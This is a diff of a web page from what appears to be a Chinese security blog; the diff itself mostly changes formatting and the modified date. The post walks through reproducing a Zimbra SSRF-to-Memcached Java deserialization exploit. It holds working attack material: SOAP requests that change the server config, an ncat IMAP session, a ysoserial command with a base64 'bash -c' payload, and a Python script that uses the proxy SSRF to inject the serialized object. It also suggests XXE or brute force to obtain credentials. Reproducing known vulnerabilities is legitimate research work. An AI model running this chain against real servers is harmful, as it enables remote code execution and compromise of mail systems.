@@ -24,12 +24,12 @@
     var CONFIG = {"hostname":"redn3ck.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="环境搭建我就不搭建了，其实我按照作者给的搭建过程也没搭建成功，我直接使用一个现成环境测试。 利用条件需要获取到3个变量  zmImap:[accountId]:[folderNo]:[modseq]:[uidvalidity]  阅读本篇文章能了解到：Zimbra, 反序列化">
+  <meta name="description" content="¶环境搭建 我就不搭建了，其实我按照作者给的搭建过程也没搭建成功，我直接使用一个现成环境测试。 ¶利用条件 需要获取到3个变量  zmImap:[accountId]:[folderNo]:[modseq]:[uidvalidity]  阅读本篇文章能了解到：Zimbra, 反序列化">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Zimbra - SSRF+Memcached+反序列化复现">
 <meta property="og:url" content="https://redn3ck.github.io/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="redn3ck&#39;s blog">
-<meta property="og:description" content="环境搭建我就不搭建了，其实我按照作者给的搭建过程也没搭建成功，我直接使用一个现成环境测试。 利用条件需要获取到3个变量  zmImap:[accountId]:[folderNo]:[modseq]:[uidvalidity]  阅读本篇文章能了解到：Zimbra, 反序列化">
+<meta property="og:description" content="¶环境搭建 我就不搭建了，其实我按照作者给的搭建过程也没搭建成功，我直接使用一个现成环境测试。 ¶利用条件 需要获取到3个变量  zmImap:[accountId]:[folderNo]:[modseq]:[uidvalidity]  阅读本篇文章能了解到：Zimbra, 反序列化">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://redn3ck.github.io/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/list.jpg">
 <meta property="og:image" content="https://redn3ck.github.io/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/listResult.jpg">
@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://redn3ck.github.io/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/imap.jpg">
 <meta property="og:image" content="https://redn3ck.github.io/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/success.jpg">
 <meta property="article:published_time" content="2019-04-30T08:24:37.000Z">
-<meta property="article:modified_time" content="2019-04-30T09:25:21.438Z">
+<meta property="article:modified_time" content="2021-09-27T02:22:18.036Z">
 <meta property="article:author" content="redn3ck">
 <meta property="article:tag" content="Zimbra">
 <meta property="article:tag" content="反序列化">
@@ -229,10 +229,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2019-04-30 16:24:37 / 修改时间：17:25:21" itemprop="dateCreated datePublished" datetime="2019-04-30T16:24:37+08:00">2019-04-30</time>
+              <time title="创建时间：2019-04-30 16:24:37" itemprop="dateCreated datePublished" datetime="2019-04-30T16:24:37+08:00">2019-04-30</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-09-27 10:22:18" itemprop="dateModified" datetime="2021-09-27T10:22:18+08:00">2021-09-27</time>
+              </span>
 
           
             <span id="/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" class="post-meta-item leancloud_visitors" data-flag-title="Zimbra - SSRF+Memcached+反序列化复现" title="阅读次数">
@@ -266,59 +272,67 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我就不搭建了，其实我按照作者给的搭建过程也没搭建成功，我直接使用一个现成环境测试。</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>需要获取到3个变量</p>
+        <h2 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h2>
+<p>我就不搭建了，其实我按照作者给的搭建过程也没搭建成功，我直接使用一个现成环境测试。</p>
+<h2 id="利用条件"><a class="header-anchor" href="#利用条件">¶</a>利用条件</h2>
+<p>需要获取到3个变量</p>
 <blockquote>
 <p>zmImap:[accountId]:[folderNo]:[modseq]:[uidvalidity]</p>
 </blockquote>
 <div class="note info"><p>阅读本篇文章能了解到：<span class="label success">Zimbra</span>, <span class="label success">反序列化</span></p></div>
-
 <a id="more"></a>
-
-<p><code>accountId</code>：用户的<code>ID</code>，通过登陆zimbra获取<br><code>folderNo</code>：2，代表<code>inbox</code><br><code>modseq</code>和<code>uidvalidity</code>通过登陆imap获取</p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-设置zimbraMemcachedClientServerList"><a href="#1-设置zimbraMemcachedClientServerList" class="headerlink" title="1. 设置zimbraMemcachedClientServerList"></a>1. 设置zimbraMemcachedClientServerList</h3><blockquote>
+<p><code>accountId</code>：用户的<code>ID</code>，通过登陆zimbra获取<br>
+<code>folderNo</code>：2，代表<code>inbox</code><br>
+<code>modseq</code>和<code>uidvalidity</code>通过登陆imap获取</p>
+<h2 id="步骤"><a class="header-anchor" href="#步骤">¶</a>步骤</h2>
+<h3 id="1-设置zimbraMemcachedClientServerList"><a class="header-anchor" href="#1-设置zimbraMemcachedClientServerList">¶</a>1. 设置zimbraMemcachedClientServerList</h3>
+<blockquote>
 <p>Imap的<code>zimbraMemcachedClientServerList</code>默认为空，无法使用<code>ImapSession</code>的反序列化，所以需要自己命令行设置</p>
 </blockquote>
 <p>web环境当然没办法执行命令，根据作者的思考，<code>ModifyServer</code>可实现通过web修改。</p>
 <figure class="highlight xml"><figcaption><span>ModifyConfigRequest</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:zimbra&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ZimbraWebClient - FF52 (Win)&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">session</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;3129324&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">format</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;js&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">csrfToken</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span>&gt;</span>0_62c250d442e69ba3a624ac1bea96dac8648b86f6<span class="tag">&lt;/<span class="name">csrfToken</span>&gt;</span><span class="tag">&lt;/<span class="name">context</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">BatchRequest</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:zimbra&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;stop&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">ModifyConfigRequest</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:zimbraAdmin&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span> <span class="attr">n</span>=<span class="string">&quot;zimbraMemcachedClientServerList&quot;</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">ModifyConfigRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">BatchRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="list.jpg" alt="list"></p>
 <p>可通过命令查看是否设置成功</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/zimbra/bin/zmprov gs `/opt/zimbra/bin/zmhostname` zimbraMemcachedClientServerList</span><br></pre></td></tr></table></figure>
-
 <p><img src="listResult.jpg" alt="listResult"></p>
-<h3 id="2-reload"><a href="#2-reload" class="headerlink" title="2. reload"></a>2. reload</h3><p>根据作者说法，reload后即可完成<code>Memcached</code>重载</p>
+<h3 id="2-reload"><a class="header-anchor" href="#2-reload">¶</a>2. reload</h3>
+<p>根据作者说法，reload后即可完成<code>Memcached</code>重载</p>
 <figure class="highlight xml"><figcaption><span>ReloadMemcachedClientConfigRequest</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:zimbra&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ZimbraWebClient - FF52 (Win)&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">session</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;3129324&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">format</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;js&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">csrfToken</span> <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span>&gt;</span>0_62c250d442e69ba3a624ac1bea96dac8648b86f6<span class="tag">&lt;/<span class="name">csrfToken</span>&gt;</span><span class="tag">&lt;/<span class="name">context</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">BatchRequest</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:zimbra&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;stop&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">ReloadMemcachedClientConfigRequest</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:zimbraAdmin&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ReloadMemcachedClientConfigRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">BatchRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>web请求响应<code>reloadResponse</code>正常，证明reload成功</p>
 <p><img src="reload.jpg" alt="reload"></p>
 <p>但我实测发现并不行，需要<code>zmcontrol restart</code>，坑了很久，也就是说无法<code>reload</code>让zimbra重新加载<code>memcached</code>，到这一步就感觉鸡肋了，但也可能是我姿势有误。</p>
-<h3 id="3-获取id"><a href="#3-获取id" class="headerlink" title="3. 获取id"></a>3. 获取id</h3><p>如果能<code>xxe</code>打到<code>localconfig.xml</code>，即拿到<code>ldap_password</code>，此时可通过管理账号创建一个新用户，无需登录即可得到<code>id</code>，如图所示</p>
+<h3 id="3-获取id"><a class="header-anchor" href="#3-获取id">¶</a>3. 获取id</h3>
+<p>如果能<code>xxe</code>打到<code>localconfig.xml</code>，即拿到<code>ldap_password</code>，此时可通过管理账号创建一个新用户，无需登录即可得到<code>id</code>，如图所示</p>
 <p><img src="creatAccount.jpg" alt="creatAccount"></p>
 <p>若未能<code>xxe</code>，则只能通过其他手段（暴破等）获取一个用户账密</p>
-<h3 id="4-获取modseq和uidvalidity"><a href="#4-获取modseq和uidvalidity" class="headerlink" title="4. 获取modseq和uidvalidity"></a>4. 获取modseq和uidvalidity</h3><p>使用刚创建的用户登录imap，并<code>select inbox</code>获取；<br><code>imap</code>端口为<code>143</code>、<code>993</code>，<code>143</code>个别机器允许明文登录，大多数不可明文登录且有很多奇怪错误，故使用<code>993</code>加密登录</p>
+<h3 id="4-获取modseq和uidvalidity"><a class="header-anchor" href="#4-获取modseq和uidvalidity">¶</a>4. 获取modseq和uidvalidity</h3>
+<p>使用刚创建的用户登录imap，并<code>select inbox</code>获取；<br>
+<code>imap</code>端口为<code>143</code>、<code>993</code>，<code>143</code>个别机器允许明文登录，大多数不可明文登录且有很多奇怪错误，故使用<code>993</code>加密登录</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ncat --ssl [ip] 993</span><br><span class="line">axyz login <span class="built_in">test</span> test123456</span><br><span class="line">a select inbox</span><br><span class="line">axyz <span class="built_in">logout</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="imap.jpg" alt="imap"></p>
-<h3 id="5-生成payload"><a href="#5-生成payload" class="headerlink" title="5. 生成payload"></a>5. 生成payload</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/">ysoserial</a>源码，此处作者没说清，需要修改<code>pom.xml</code>，将<code>1.7R2</code>改为<code>1.6R7</code>，然后重新打包，打包过程让同事帮忙完成。</p>
+<h3 id="5-生成payload"><a class="header-anchor" href="#5-生成payload">¶</a>5. 生成payload</h3>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/">ysoserial</a>源码，此处作者没说清，需要修改<code>pom.xml</code>，将<code>1.7R2</code>改为<code>1.6R7</code>，然后重新打包，打包过程让同事帮忙完成。</p>
 <p><code>echo justatest &gt; /tmp/justatest.txt</code></p>
 <p>payload从这<a target="_blank" rel="noopener" href="http://jackson-t.ca/runtime-exec-payloads.html">http://jackson-t.ca/runtime-exec-payloads.html</a>生成</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar MozillaRhino2 &quot;bash -c &#123;echo,ZWNobyBqdXN0YXRlc3QgPiAvdG1wL2p1c3RhdGVzdC50eHQ&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; wakaka.obj</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="6-SSRF-to-Memcached"><a href="#6-SSRF-to-Memcached" class="headerlink" title="6. SSRF to Memcached"></a>6. SSRF to Memcached</h3><p>使用作者给的请求脚本，修改上述获取的到3个值，和<code>adminToken</code>及域名，利用<code>ssrf</code>向<code>11211</code>发起请求</p>
+<h3 id="6-SSRF-to-Memcached"><a class="header-anchor" href="#6-SSRF-to-Memcached">¶</a>6. SSRF to Memcached</h3>
+<p>使用作者给的请求脚本，修改上述获取的到3个值，和<code>adminToken</code>及域名，利用<code>ssrf</code>向<code>11211</code>发起请求</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">accountid = <span class="string">&quot;[2ebf42fc-d971-438c-8734-912f4ed90fa9]&quot;</span> </span><br><span class="line">folderNo= <span class="number">2</span> </span><br><span class="line">modseq = [<span class="number">1</span>]</span><br><span class="line">uidvalidity = [<span class="number">1</span>]</span><br><span class="line">cacheKey =<span class="string">&quot;zmImap:&#123;accountId&#125;:&#123;folderNo&#125;:&#123;modseq&#125;:&#123;uidvalidity&#125;&quot;</span>.format(accountId=accountid,folderNo=str(folderNo),modseq=str(modseq),uidvalidity=str(uidvalidity)) </span><br><span class="line">print(cacheKey) </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&quot;wakaka.obj&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f: </span><br><span class="line">	payload = f.read() </span><br><span class="line">	</span><br><span class="line">set_command = <span class="string">b&quot;set &#123;cacheKey&#125; 2048 3600 &#123;payloadsize&#125;\r\n&quot;</span>.format(cacheKey=cacheKey,payloadsize=str(len(payload)))+payload+<span class="string">&quot;\r\n&quot;</span> </span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=[0_a371057a5246a4e62484dee80cc0733a6b2d10d2_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313535363633363536323334373b61646d696e3d313a313b747970653d363a7a696d6272613b753d313a613b7469643d393a3136353638373835343b];&quot;</span>, <span class="string">&quot;host&quot;</span>:<span class="string">&quot;[domain.com]:7071&quot;</span>&#125; </span><br><span class="line">r = requests.post(<span class="string">&quot;https://[domain.com]/service/proxy?target=http://127.0.0.1:11211&quot;</span>,data=set_command,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="7-触发反序列化"><a href="#7-触发反序列化" class="headerlink" title="7. 触发反序列化"></a>7. 触发反序列化</h3><p>再次imap登陆同一账号并<code>select inbox</code></p>
+<h3 id="7-触发反序列化"><a class="header-anchor" href="#7-触发反序列化">¶</a>7. 触发反序列化</h3>
+<p>再次imap登陆同一账号并<code>select inbox</code></p>
 <p>查看<code>/tmp</code>目录</p>
 <p><img src="success.jpg" alt="success"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
+<ol>
 <li>目标需开放<code>7071</code></li>
 <li>能重启zimbra服务器，或<code>reload</code>成功完成加载</li>
 </ol>
-<p>这么一看，妈耶，好鸡肋<br>但有朋友告诉我，条件允许的话，<code>7071</code>不开放也可行，若<code>7071</code>开放，还能通杀？包括<code>8.8.x</code>，也许他们研究出了<code>ssrf</code>带<code>cookie</code>的操作？<br>好吧，研究不透，有研究的朋友可以交流一下。</p>
+<p>这么一看，妈耶，好鸡肋<br>
+但有朋友告诉我，条件允许的话，<code>7071</code>不开放也可行，若<code>7071</code>开放，还能通杀？包括<code>8.8.x</code>，也许他们研究出了<code>ssrf</code>带<code>cookie</code>的操作？<br>
+好吧，研究不透，有研究的朋友可以交流一下。</p>
 <p>另外说下原作者<code>fnmsd</code>，人超好，问问题回答的很详细，很有耐心，这篇整体的复现遇到很多坑，师傅也帮我各种解答，十分感谢！阿里嘎多！</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fnmsd/article/details/89235589">https://blog.csdn.net/fnmsd/article/details/89235589</a></p>
+<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fnmsd/article/details/89235589">https://blog.csdn.net/fnmsd/article/details/89235589</a></p>
 
     </div>
 
